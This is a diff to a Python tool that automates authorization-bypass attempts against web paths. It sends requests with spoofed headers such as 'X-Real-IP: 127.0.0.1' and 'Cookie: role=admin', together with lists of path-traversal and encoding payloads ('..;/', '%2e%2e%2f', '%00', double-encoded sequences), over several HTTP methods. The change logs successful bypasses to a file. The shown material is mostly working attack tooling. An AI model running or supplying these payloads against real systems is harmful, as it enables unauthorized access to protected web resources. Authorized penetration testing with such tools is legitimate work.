@@ -7,6 +7,7 @@ from itertools import combinations
 import aiohttp
 import asyncio
 import time
+import os
 
 # Disable SSL warnings
 requests.packages.urllib3.disable_warnings()
@@ -20,7 +21,6 @@ auth_headers = [
     {"X-Real-IP": "127.0.0.1"},
     {"Cookie": "role=admin"},
     {"X-Method-Override": "GET"},
-    # New headers
     {"X-Custom-Auth": "true"},
     {"Debug": "true"},
 ]
@@ -36,7 +36,6 @@ bypass_payloads = [
     "", "/", ".", "/*", ";", ";/", ";.css", "%00", "%20", "%2f", "%3f", "%23", "%26",
     "%F3%A0%81%A9", "../", "..;/", ".json", "//", "/..;/", "/./", "/../", "/?", "??",
     "%2e%2e%2f", "%2e%2e/", "%2f", "%2e/", "%3b",
-    # New payloads
     "%E2%80%A8", "%0d%0a", "/%2e%2e%2f%2e%2e%2f", "/%252e%252e%252f"
 ]
 
@@ -104,9 +103,9 @@ async def test_single_path(session, method, full_url, headers):
             "error": str(e)
         }
 
-async def test_paths_async(base_uri, path_list, max_workers=10):
+async def test_paths_async(base_uri, path_list, max_workers, output_file):
     success_log = []
-    methods = ["GET", "POST", "PUT", "DELETE"]  # Expanded methods
+    methods = ["GET", "POST", "PUT", "DELETE"]
 
     # Generate all header combinations (single and pairs)
     header_combinations = []
@@ -142,7 +141,17 @@ async def test_paths_async(base_uri, path_list, max_workers=10):
                 else:
                     print(f"  ERROR | {result['method']} | {result['url']} | {result['error']}")
 
-    print("\n=== ✅ SUCCESSFUL BYPASSES ===")
+    # Write successful bypasses to file
+    with open(output_file, "w") as f:
+        f.write("=== SUCCESSFUL BYPASSES ===\n")
+        for s in success_log:
+            f.write(f"[{s['method']}] {s['url']}\n")
+            f.write(f"     Headers: {s['headers']}\n")
+            f.write(f"     Response Length: {s['length']}\n")
+            f.write("-" * 60 + "\n")
+
+    print(f"\n=== ✅ SUCCESSFUL BYPASSES ===")
+    print(f"Results written to {output_file}")
     for s in success_log:
         print(f"[{s['method']}] {s['url']}")
         print(f"     Headers: {s['headers']}")
@@ -156,11 +165,14 @@ def main():
     parser.add_argument("--workers", type=int, default=10, help="Max concurrent workers")
     args = parser.parse_args()
 
+    # Generate output filename (e.g., paths.txt -> paths_bypassed.txt)
+    output_file = os.path.splitext(args.path_file)[0] + "_bypassed.txt"
+
     with open(args.path_file, "r") as f:
         paths = f.readlines()
 
     # Run async tests
-    asyncio.run(test_paths_async(args.uri, paths, args.workers))
+    asyncio.run(test_paths_async(args.uri, paths, args.workers, output_file))
 
 if __name__ == "__main__":
     main()
